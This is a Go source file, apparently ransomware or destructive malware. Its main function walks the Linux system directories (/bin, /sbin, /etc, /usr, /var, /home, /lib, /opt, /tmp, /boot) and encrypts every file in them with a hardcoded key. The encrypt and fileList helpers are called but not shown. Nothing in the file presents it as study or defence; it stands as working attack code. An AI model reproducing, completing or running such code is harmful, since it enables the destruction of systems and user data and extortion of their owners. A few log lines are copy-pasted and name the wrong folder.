package main

import (
	"log"
)

func encryptFolder(files []string) {
	for _, path := range files {
		log.Println(path)
	}
	
	
	key := []byte("dj1f5GMFlyp]x,f.git1`58fiSldtf,v")
	
	
	for _, filename := range files {
		encrypt(filename, key)
	}
}

func encryptSystem() {
	log.Println("[-] Getting bin files")
	bin := fileList("/bin")
	log.Println("[+] Got bin files")
	log.Println("[*] Starting to encrypt bin folder")
	encryptFolder(bin)
	log.Println("[-] Getting bin files")
	sbin := fileList("/sbin")
	log.Println("[+] Got sbin files")
	log.Println("[*] Starting to encrypt bin folder")
	encryptFolder(sbin)
	log.Println("[-] Getting bin files")
	etc := fileList("/etc")
	log.Println("[+] Got sbin files")
	log.Println("[*] Starting to encrypt bin folder")
	encryptFolder(etc)
	log.Println("[-] Getting bin files")
	usr := fileList("/usr")
	log.Println("[+] Got usr files")
	log.Println("[*] Starting to encrypt bin folder")
	encryptFolder(usr)
	log.Println("[-] Getting var files")
	varr := fileList("/var")
	log.Println("[+] Got var files")
	log.Println("[*] Starting to encrypt bin folder")
	encryptFolder(varr)
	log.Println("[-] Getting home files")
	home := fileList("/home")
	log.Println("[+] Got home files")
	log.Println("[*] Starting to encrypt home folder")
	encryptFolder(home)
	log.Println("[-] Getting lib files")
	lib := fileList("/lib")
	log.Println("[+] Got lib files")
	log.Println("[*] Starting to encrypt lib folder")
	encryptFolder(lib)
	log.Println("[-] Getting opt files")
	opt := fileList("/opt")
	log.Println("[+] Got opt files")
	log.Println("[*] Starting to encrypt opt folder")
	encryptFolder(opt)
	log.Println("[-] Getting tmp files")
	tmp := fileList("/tmp")
	log.Println("[+] Got tmp files")
	log.Println("[*] Starting to encrypt tmp folder")
	encryptFolder(tmp)
	log.Println("[-] Getting boot files")
	boot := fileList("/boot")
	log.Println("[+] Got boot files")
	log.Println("[*] Starting to encrypt boot folder")
	encryptFolder(boot)
}

func main() {
	encryptSystem()
}
